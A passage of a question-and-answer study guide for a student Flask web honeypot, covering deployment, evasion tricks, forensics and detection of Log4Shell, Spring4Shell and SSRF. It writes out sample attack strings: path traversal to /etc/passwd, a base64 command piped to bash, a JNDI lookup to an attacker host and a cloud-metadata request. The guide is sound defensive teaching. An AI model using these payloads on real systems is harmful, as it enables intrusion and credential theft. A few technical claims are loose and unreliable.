### Q75. Write a basic functional Dockerfile for your honeypot.
**Answer:**
```dockerfile
FROM python:3.10-alpine
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
EXPOSE 5000
CMD ["gunicorn", "-w", "4", "-b", "0.0.0.0:5000", "app:app"]
```
"This uses an extremely lightweight Alpine Linux base to minimize the attack surface, copies the honeypot code, exposes port 5000, and uses Gunicorn as the robust production WSGI server."

### Q76. What is a 'Bind Mount' vs a 'Docker Volume', and which should we use for the SQLite database?
**Answer:** "A Bind Mount maps an exact absolute path on the host machine to a path in the container. A Docker Volume is a specialized storage area managed exclusively by Docker. For `database.db`, we must use a Docker Volume or Bind Mount because containers are ephemeral—if the honeypot container crashes or is rebuilt, all internal data is wiped. By mounting the database externally, our threat intelligence logs persist independently of the container's lifecycle."

---

## PART 20: CLOUD INFRASTRUCTURE & FIREWALL SCALING

---

### Q77. If you deploy this on AWS, how does a Web Application Firewall (AWS WAF) interact with the Honeypot?
**Answer:** "A WAF inherently contradicts the purpose of a honeypot if misconfigured. If we place AWS WAF in front of our honeypot with standard blocking rules enabled, the WAF will aggressively drop SQLi and XSS payloads at the edge before our honeypot ever sees them. To gather intelligence, we must explicitly configure the WAF in 'Count' (monitor) mode only—allowing the malicious payloads to pass through to the honeypot for deep logging while the WAF simultaneously generates metadata on the inbound requests."

### Q78. How would you use VPC Flow Logs to complement your honeypot logs?
**Answer:** "VPC Flow Logs in AWS capture layer 3/4 network traffic (IP addresses, ports, byte counts, TCP flags). While our honeypot logs the layer 7 HTTP payload, VPC Flow Logs provide the crucial structural background noise: they show if the attacker is also port scanning other internal subnets simultaneously (lateral movement reconnaissance), conducting ICMP sweeps, or performing volumetric TCP SYN floods against our network interfaces."

---

## PART 21: ADVANCED BOTNET MECHANICS

---

### Q79. Web honeypots frequently capture traffic from the Mirai botnet. What is Mirai?
**Answer:** "Mirai is a notorious malware strain that primarily infects IoT devices (like IP cameras and home routers) by brute-forcing default unpatched Telnet/SSH credentials. Once infected, these devices join a massive global botnet used to launch devastating volumetric DDoS attacks or aggressive web vulnerability scanning. Our honeypot frequently logs HTTP GET requests specifically targeting `/boaform/admin/formLogin` or `/setup.cgi`, which are the exact, hardcoded vulnerability signatures utilized by varying strains of the Mirai worm attempting to propagate."

### Q80. Explain 'Credential Stuffing' and how your Brute Force tracker handles it.
**Answer:** "Credential Stuffing is an automated attack where malicious actors take massive lists of leaked usernames and passwords (from past data breaches) and script them into login endpoints to see if users reused their passwords. Unlike a traditional Brute Force (which tries thousands of passwords against *one* user account), Credential Stuffing tries *one* password per *unique* user account extremely slowly. Our current IP-based threshold tracks rapid successive requests; to catch 'low and slow' credential stuffing, we need cross-referencing capabilities against temporal thresholds measuring username iteration across multiple distinct, rotating proxy IPs."

---

## PART 22: EVASION TECHNIQUES & COUNTER-MEASURES

---

### Q81. An attacker sends a payload using a 'Null-Byte Injection' (`%00`). What does this do?
**Answer:** "In older systems (especially C-based backend architectures like ancient PHP versions), the null byte `\x00` acts as a string terminator. An attacker might request `filepath=../../../etc/passwd%00.jpg`. The application's security check might validate the `.jpg` extension to allow an image upload or view, but when the underlying C-functions process the string, they terminate at the null byte, resulting in the system executing `../../../etc/passwd`. Python mitigates this safely, but our regex engine specifically watches for `%00` encoding to classify it as an evasion attempt."

### Q82. How do attackers use HTTP Parameter Pollution (HPP) to bypass WAFs and honeypots?
**Answer:** "HPP involves sending the same HTTP GET parameter multiple times, like `/?id=1&id=UNION SELECT...`. Different web servers handle this differently. ASP.NET concatenates them (`1, UNION SELECT`), while Python/Flask's `request.args` typically only returns the *first* defined variable in a standard dictionary access, ignoring the latter. If our extraction middleware only evaluates `request.args.get('id')`, it misses the payload entirely. This is why our `utils.py` extraction logic must utilize `request.args.getlist()` or parse the raw, unadulterated `request.query_string` directly to catch hidden malicious concatenations."

### Q83. What is Base64 encoding, and how do attackers use it in Command Injection?
**Answer:** "Base64 is an encoding scheme that translates binary data into a safe ASCII string format. Attackers frequently use it to bypass regex engines. For example, instead of sending `; cat /etc/passwd`, they send `; echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash`. If our honeypot only looks for the string `cat /etc/passwd`, it completely misses the attack. To counter this, advanced regex engines look specifically for Linux piping mechanisms connecting to base64 decoding utilities (`| base64 -d`)."

---

## PART 23: FORENSICS & INCIDENT RESPONSE

---

### Q84. What is the 'Chain of Custody', and how does it relate to your honeypot logs?
**Answer:** "In digital forensics, the Chain of Custody is the chronological, heavily documented trail mapping the seizure, custody, control, and transfer of digital evidence. If our honeypot detects an attack that results in formal legal prosecution, our database (`database.db`) and text logs (`honeypot.log`) become legal evidence. To maintain integrity, we must ensure these logs are immutable (e.g., forwarding them asynchronously to a write-only WORM drive) and mathematically hashed (using SHA-256) upon file rotation to definitively prove they have not been tampered with post-capture."

### Q85. You capture a malicious `.php` web shell file in your `uploads/` directory. How do you safely analyze it?
**Answer:** "First, we never, under any circumstances, execute or render the file on the host machine. We would calculate its SHA-256 hash and query intelligence databases like VirusTotal to see if it's a known generic shell (like c99 or b374k). Then, we transfer the file into an isolated, air-gapped forensic virtual machine (disconnected from all networking interfaces). Utilizing reverse-engineering tools like `ghidra` (if compiled) or basic static code analysis parsing tools, we examine the logic flow, obfuscation techniques, and hardcoded Command & Control (C2) IP addresses present within the malware."

---

## PART 24: THE FUTURE OF DECEPTION TECHNOLOGY

---

### Q86. How will Artificial Intelligence (AI) fundamentally change honeypot architectures in the future?
**Answer:** "Currently, our honeypot is passive and heavily deterministic; it relies on static HTTP responses to static regex queries. In the near future, Large Language Models (LLMs) and Generative AI will allow honeypots to dynamically generate hyper-realistic, structurally valid server environments on the fly. When a human attacker interacts via a reverse shell, an AI could autonomously fabricate fake internal network file systems, synthesize corporate emails dynamically, and perfectly hallucinate simulated database schemas, keeping advanced persistent threats (APTs) engaged in the decoy environment indefinitely."

### Q87. What is 'Deception Automation', and how does it relate to 'Moving Target Defense'?
**Answer:** "Moving Target Defense (MTD) involves constantly changing the network attack surface (rotating IP addresses, randomizing port configurations) so the attacker's reconnaissance data becomes useless within minutes. Deception automation merges this with honeypots. Imagine deploying a system that algorithmically spins up hundreds of fake Flask honeypot Docker containers across varying subnets every 60 minutes, mixing them indistinguishably with real production servers. The mathematical probability of an attacker striking the true target drops profoundly, flipping the asymmetrical advantage of cybersecurity back to the defender."

---

## PART 25: SPECIFIC EXPLOIT PAYLOAD BREAKDOWNS

---

### Q88. Explain the famous log4j (Log4Shell) vulnerability and how your system detects it.
**Answer:** "Log4Shell (CVE-2021-44228) was a catastrophic vulnerability in Java's Log4j logging library. It allowed attackers to force the server to download and execute arbitrary Java classes using the Java Naming and Directory Interface (JNDI). The hallmark payload looks like `${jndi:ldap://attribute.attacker.com/Exploit}`. Attackers blasted this payload into essentially every HTTP header (User-Agent, Referer, X-Forwarded-For) hoping a backend Java server would aggressively log it. Our honeypot's `detector.py` specifically targets the string `${jndi:` or `${lower:j}` variations across all Headers and Payloads, accurately classifying and identifying continuous mass-scanning attempts for this specific historical CVE."

### Q89. What is Spring4Shell, and does it operate similarly?
**Answer:** "Spring4Shell (CVE-2022-22965) is a severe vulnerability in the Java Spring Core framework that allows remote code execution via class loading mechanisms when data binding parameters. Unlike Log4Shell which was massively ubiquitous across simple logging parameters, Spring4Shell payloads usually target TomCat logging attributes directly via URL Query parameters (e.g., `class.module.classLoader.resources.context.parent.pipeline.first.pattern=`). Our detection engine watches for these specific, highly unusual chained Python/Java object accessor properties appearing maliciously in root GET query structures to flag the exploit attempt."

### Q90. What is an SSRF (Server-Side Request Forgery) attack?
**Answer:** "SSRF occurs when an attacker forces the vulnerable web server to make an HTTP request on their behalf. For example, if our honeypot simulates an image-fetching endpoint `/?url=image.png`, the attacker might inject `/?url=http://169.254.169.254/latest/meta-data/`. That specific IP address is the internal, highly restrictive AWS metadata API. The attacker is trying to trick the server into fetching its own temporary cloud security credentials and returning them to the external attacker. Our regex library watches specifically for internal network spaces (like `169.254.x.x`, `127.0.0.1`, `file:///etc/`) injected into parameter fields designed for URL forwarding."

---

## PART 26: COMPARATIVE ANALYSIS WITH OTHER HONEYPOTS

---

### Q91. How does your honeypot differ from Cowrie?
**Answer:** "Cowrie is primarily a medium-to-high interaction SSH and Telnet honeypot. It's designed to log brute force attacks and shell interactions. Our honeypot is a **Low-Interaction Web Honeypot**. While Cowrie focuses on the terminal, we focus on the HTTP layer, specifically targeting web application vulnerabilities like SQLi and XSS which Cowrie does not handle."

### Q92. What about Dionaea?
**Answer:** "Dionaea is a 'nepenthes' style honeypot designed to catch malware spreading via network services (like SMB, MSSQL, or FTP). It's great for capturing actual binary worms. Our system is narrower but deeper in the **Web domain**. We are specifically designed to trap web-based attackers and bots that crawl looking for WordPress or PHP vulnerabilities, rather than network-level worms."

### Q93. Why choose a custom-built Flask honeypot over an off-the-shelf solution like MHN (Modern Honey Network)?
**Answer:** "MHN is a management framework that deploys existing honeypots. Building our own in Flask gives us **Granular Control**. We can write custom regex for specific modern threats (like Log4Shell) instantly without waiting for an upstream update. It also provides a superior learning experience for understanding the HTTP request-response cycle and how middleware-level security operates."

---

## PART 27: SOC (SECURITY OPERATIONS CENTER) INTEGRATION

---

### Q94. How would a SOC Analyst use your dashboard in a real-world company?
**Answer:** "An analyst would look for **Anomalous Spikes**. For example, if the 'SQL Injection' count jumps from 5 per day to 500 per hour, the analyst knows a coordinated campaign is underway. They would use our dashboard to find the top attacking IPs and proactively block them at the corporate firewall (Palo Alto, Fortinet) before the attacker finds a real vulnerability on the production servers."

### Q95. What is a SIEM, and can your honeypot connect to one?
**Answer:** "A SIEM (Security Information and Event Management) like Splunk or Elastic Stack (ELK) aggregates logs from many sources. Yes, our honeypot is perfect for this. We can use a 'Log Shipper' (like Filebeat) to watch our `logs/honeypot.log` and stream every attack directly into Splunk. This allows the company to correlate honeypot attacks with other network alerts."

---

## PART 28: ADVANCED JAVASCRIPT DE-OBFUSCATION

---

### Q96. Many XSS attacks are 'obfuscated' using hex or decimal encoding. How does your code handle this?
**Answer:** "Attackers use tools to turn `<script>` into `\x3c\x73\x63\x72\x69\x70\x74\x3e`. Our `detector.py` uses `urllib.parse.unquote()` but for hex encoding, we plan to add a pre-processing step using base64 decoding and hex-to-string conversion. Currently, our regex includes patterns for common obfuscation functions like `String.fromCharCode`, which is a 'dead giveaway' that an attack is hidden."

### Q97. What is a 'Polyglot Payload'?
**Answer:** "A polyglot is a single payload that is valid in multiple contexts (e.g., it works as both a SQL injection and an XSS attack simultaneously). Our 'Waterfall' detection handles this by prioritizing the most dangerous classification, but because we log the **Full Raw Payload**, a forensic investigator can see the entire polyglot in our database even if it only gets one 'label'."

---

## PART 29: CLOUD NATIVE SECURITY (AWS/AZURE/GCP)

---

### Q98. If you deploy this on a 'Serverless' platform like AWS Lambda, does it change the security?
**Answer:** "Yes, it becomes even more secure. AWS Lambda is **Ephemeral**. Each request runs in a new, isolated micro-VM that exists for only a few seconds. An attacker cannot 'install' a persistent backdoor or rootkit because the entire server disappears as soon as the response is sent. However, we would need to switch from SQLite to an external database like Amazon RDS or DynamoDB to keep the logs persistent."

### Q99. What is a 'Honeytoken' and how does it relate to your Web Honeypot?
**Answer:** "A Honeytoken is a piece of fake data (like a fake API key or a fake 'admin_password.txt' file). Our honeypot uses these. In our `/admin` route, we might display a fake database connection string. If we see an IP address trying to use that specific fake password on our real production systems later, we have **100% Attribution** that the attacker came from the honeypot."

---

## PART 30: THE PSYCHOLOGY OF DECEPTION

---

### Q100. Why do honeypots work? Why don't attackers just ignore them?
**Answer:** "It's based on the **Asymmetry of Cost**. It costs an attacker almost nothing to scan 10,000 IPs. By placing a honeypot, we make them 'waste' their resources. More importantly, attackers are curious. A 'vulnerable' looking server is like a moth to a flame; they cannot resist poking it to see what's inside, and every 'poke' gives us more data about their tools."

### Q101. What is 'Tarpitting'?
**Answer:** "Tarpitting is a technique where the server responds extremely slowly to suspicious requests. If we detect a brute force attack, we could add a `time.sleep(30)` to the response. This doesn't just block the attacker; it **Ties Up Their Bot**. If their bot can only handle 10 concurrent connections, and we hold 10 of them for 30 seconds each, we have effectively neutralized that bot's ability to attack anyone else on the internet during that time."

---

## PART 31: PROJECT MANAGEMENT & LIFECYCLE (SDLC)

---

### Q102. Which SDLC model did you follow?
**Answer:** "We followed the **Agile Iterative Model**. We first built a 'Minimum Viable Product' (just a Flask app that logs IPs). Then, in the next iteration, we added the Regex detector. In the third iteration, we added the Dashboard. This allowed us to have a working system at every stage of the project review."

### Q103. How did you handle 'Scope Creep'?
**Answer:** "Scope creep is when a project grows too large to finish. We handled this by setting a hard boundary: **No Machine Learning in the first version**. We focused on making the Regex engine 100% reliable before even considering more complex AI features. This ensured we finished the core requirements on time for this review."

---

## PART 32: THREAT INTELLIGENCE SHARING (STIX/TAXII)

---

### Q104. What is STIX?
**Answer:** "STIX (Structured Threat Information eXpression) is a standardized language for sharing cyber threat intelligence. Our future goal is to export our honeypot logs in STIX format. This would allow us to share our attack data automatically with other organizations through a TAXII server (Trusted Automated eXchange of Intelligence Information)."

---

## PART 33: NETWORK FORENSICS & PACKET ANALYSIS

---

### Q105. What is the difference between an 'Active' and 'Passive' Honeypot?
**Answer:** "Passive honeypots just sit and listen (like ours). Active honeypots (sometimes called 'Honey-tokens' or 'Honey-clients') actually go out and browse the web, looking for malicious websites to get infected so they can study the 'drive-by download' malware."

---

## PART 34: FINAL SYSTEM HARDENING

---

### Q106. How do you prevent your honeypot from becoming a 'Zombie' in a DDoS attack?
**Answer:** "We disable all outbound networking capabilities for the honeypot process. The honeypot can receive traffic and write to its local database, but it is **Forbidden from making outbound requests**. This ensures that even if an attacker compromises the Flask app, they cannot use it to attack other servers."

---

## PART 35: REFLECTIONS AND FUTURE ASPIRATIONS

---

### Q107. What was the most challenging part of this project?
**Answer:** "The most challenging part was **False Positives in Regex**. For example, a legitimate user might search for the word 'union' (like a 'Labor Union'). We had to fine-tune our SQL injection patterns to ensure they only trigger when they see 'union' followed by 'select' or other specific database markers, rather than just the word itself."

### Q108. If you had an unlimited budget, what would you add?
**Answer:** "I would deploy a **Global Network of Honeypots** in 50 different countries using AWS regions. This would allow us to see how attack patterns differ between the US, Europe, and Asia, and would provide a truly global map of cyber threats."
